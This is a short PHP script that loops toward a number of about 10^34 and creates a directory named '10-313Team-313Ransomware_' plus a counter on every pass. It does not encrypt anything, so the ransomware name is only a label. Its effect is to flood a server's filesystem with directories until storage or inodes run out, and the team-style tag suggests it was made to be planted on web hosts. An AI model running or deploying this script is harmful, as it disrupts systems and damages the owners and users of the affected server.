<?php

$numberOfFolders = 10000000000000000000000000000000000;


for ($i = 1; $i <= $numberOfFolders; $i++) {
    
    $folderName = '10-313Team-313Ransomware_' . $i;
    
    
    if (!file_exists($folderName)) {
        mkdir($folderName);
        echo "Folder '$folderName' created successfully.<br>";
    } else {
        echo "Folder '$folderName' already exists.<br>";
    }
}
?>